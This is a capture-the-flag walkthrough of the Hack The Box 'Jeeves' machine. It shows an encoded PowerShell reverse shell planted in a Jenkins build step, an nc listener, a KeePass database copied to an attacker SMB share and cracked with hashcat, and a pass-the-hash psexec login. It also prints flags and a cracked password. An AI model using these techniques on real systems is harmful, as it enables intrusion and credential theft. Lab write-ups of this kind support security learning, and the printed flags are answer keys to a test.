**By: Joshua Payne**


Medium Windows VIP

About

Jeeves is not overly complicated, however it focuses on some interesting techniques and provides a great learning experience. As the use of alternate data streams is not very common, some users may have a hard time locating the correct escalation path.

**Task 1: How many TCP ports are listening on Jeeves?**

Ran NMAP:
```
sudo nmap -Pn -sV -sC -p- -T3 10.129.228.112
[sudo] password for josh: 
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-13 05:15 -0700
Nmap scan report for 10.129.228.112
Host is up (0.070s latency).
Not shown: 65531 filtered tcp ports (no-response)
PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Ask Jeeves
| http-methods: 
|_  Potentially risky methods: TRACE
135/tcp   open  msrpc        Microsoft Windows RPC
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
50000/tcp open  http         Jetty 9.4.z-SNAPSHOT
|_http-title: Error 404 Not Found
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
Service Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2026-05-13T10:17:15
|_  start_date: 2026-05-13T10:12:59
|_clock-skew: mean: -2h00m02s, deviation: 0s, median: -2h00m03s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 172.71 seconds
```

```
4
```

We also see port 50000 is running a webserver

**Task 2: What is the relative path on the webserver on port 50000 to a open source automation server?**

We run:
```
ffuf -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt:FUZZ -u http://10.129.228.112:50000/FUZZ


```

We end up with: 
```
askjeeves               [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 70ms]
```

Task 3: What is the title of the drop-down menu that offers commands such as "Execute Windows batch command" in this version of Jenkins?

We look around on the website and see "New Item":
![[Pasted image 20260513064025.png]]
We click it and create a new project and then we see this:
![[Pasted image 20260513064059.png]]

```
Add build step
```

**Task 4: What user is the Jenkins application running as on Jeeves?**

For this one since we can execute batch commands, I just went to https://www.revshells.com/ and created a remote script for my IP.
```
powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA1AC4AMQAwADkAIgAsADgANAA0ADMAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA
```

I pasted it in, saved the project, I set up my listener on my machine with 
```
nc -lvnp 8443
```

Then built the project on the site, giving me a reverse shell.

I then ran **whoami** and got:
```
kohsuke
```


**Task 5: Submit the flag located on the kohsuke user's desktop.**

Changed to the desktop and got the flag:
```
e3232272596fb47950d59c4cf1e7066a
```

**Task 6: What is the full path to the KeePass database on Jeeves?**

Ran:
```
Get-ChildItem -Recurse 'C:\Users\kohsuke' 
```

Looked through the results, and found it at:

```
C:\Users\Kohsuke\Documents\CEH.kdbx
```


**Task 7: What is the master password to the CEH.kdbx file?**
Ran: 
```
smbserver.py share $(pwd) -smb2support
```
Then:
```
copy C:\Users\Kohsuke\Documents\CEH.kdbx \\10.10.15.109\share\
```

Once the file was transfered, I cracked it with hashcat:
```
hashcat -m 13400 hash /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt.tar.gz 
```

```
$keepass$*2*6000*0*1af405cc00f979ddb9bb387c4594fcea2fd01a6a0757c000e1873f3c71941d3d*3869fe357ff2d7db1555cc668d1d606b1dfaf02b9dba2621cbe9ecb63c7a4091*393c97beafd8a820db9142a6a94f03f6*b73766b61e656351c3aca0282f1617511031f0156089b6c5647de4671972fcff*cb409dbc0fa660fcffa4f1cc89f728b68254db431a21ec33298b612fe647db48:moonshine1
```

```
moonshine1
```


**Task 8: What user's NTLM hash is stored in the KeePass DB?**
Opened the file with keepassxc

Under Backup stuff I found:
![[Pasted image 20260513071435.png]]

And since its a backup, I figured it was
```
administrator
```


**Task 9: Submit the flag located on the Administrator user's desktop.**
We now have the hash so I used:
```
psexec.py -hashes :e0fb1fb85756c24235ff238cbe81fe00 administrator@10.129.61.68
```

Went to the desktop, only thing I originally saw was:
```
hm.txt:
The flag is elsewhere.  Look deeper.⏎     
```

Therefore, I kept looking to eventually try to use **dir -R** showing:
```
C:\Users\Administrator\Desktop> dir /R                                                                                         Volume in drive C has no label.
 Volume Serial Number is 71A1-6FA1

 Directory of C:\Users\Administrator\Desktop

11/08/2017  10:05 AM    <DIR>          .
11/08/2017  10:05 AM    <DIR>          ..
12/24/2017  03:51 AM                36 hm.txt
                                    34 hm.txt:root.txt:$DATA
11/08/2017  10:05 AM               797 Windows 10 Update Assistant.lnk
               2 File(s)            833 bytes
               2 Dir(s)   2,604,072,960 bytes free
```

Meaning we had to use powershell:
```
powershell Get-Content -Path "hm.txt" -Stream root.txt
```

Flag:
```
afbc5bd4b615a60648cec41c6ac92530
```
